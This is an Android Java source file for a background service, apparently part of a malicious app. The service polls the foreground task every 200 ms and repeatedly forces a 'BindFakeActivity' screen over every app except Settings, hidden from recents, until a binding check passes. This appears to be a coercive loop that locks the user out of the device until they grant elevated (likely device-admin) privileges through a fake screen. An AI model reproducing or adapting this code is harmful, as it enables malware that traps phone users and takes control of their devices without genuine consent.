package com.xstd.ip.service;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import com.xstd.ip.BindFakeActivity;
import com.xstd.ip.Config;
import com.xstd.ip.Tools;

/**
 * Created by michael on 13-12-23.
 */
public class WatchBindService extends Service {

    private Thread mWatchingThread;

    @Override
    public void onCreate() {
        super.onCreate();

        if (Tools.isBindingActive(getApplicationContext())) {
            stopSelf();

            return;
        }

        Config.WATCHING_SERVICE_ACTIVE_RUNNING.set(true);
        Config.WATCHING_SERVICE_ACTIVE_BREAK.set(false);
        Config.WATCHING_TOP_IS_SETTINGS.set(false);

        final ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        mWatchingThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (!Config.WATCHING_SERVICE_ACTIVE_BREAK.get()) {
                    boolean isDeviceBinded = Tools.isBindingActive(getApplicationContext());
                    if (isDeviceBinded) break;

                    try {
                        Thread.sleep(200);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    String packname = am.getRunningTasks(1).get(0).topActivity.getPackageName();

                    if (Config.isDebug) {
                        Tools.logW("[[WatchService]] current top package : " + packname + " isDeviceBinded : (" + isDeviceBinded + ")");
                    }
                    if (!"com.android.settings".equals(packname)) {
                        Config.WATCHING_TOP_IS_SETTINGS.set(false);
                        Intent i = new Intent();
                        i.setClass(getApplicationContext(), BindFakeActivity.class);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(i);

                        try {
                            Thread.sleep(500);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } else {
                        Config.WATCHING_TOP_IS_SETTINGS.set(true);
                    }
                }

                Config.WATCHING_SERVICE_ACTIVE_BREAK.set(true);
                stopSelf();
            }
        });

        mWatchingThread.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Config.WATCHING_SERVICE_ACTIVE_RUNNING.set(false);
        Config.WATCHING_TOP_IS_SETTINGS.set(false);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
